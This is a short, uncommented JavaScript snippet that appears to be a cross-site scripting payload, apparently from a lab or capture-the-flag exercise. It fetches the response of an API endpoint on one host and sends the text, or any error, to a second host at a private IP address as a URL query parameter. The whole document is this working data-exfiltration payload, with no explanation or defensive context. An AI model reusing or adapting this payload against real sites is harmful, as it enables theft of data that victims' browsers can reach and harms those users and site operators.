
fetch("https://guitjapeo.thl/api/info")
        .then(resp => resp.text())
        .then(text => {
            fetch(`http://10.0.2.17/?text=${text}`);
        })
        .catch(err => {
            fetch(`http://10.0.2.17/?err=${err}`);
        });
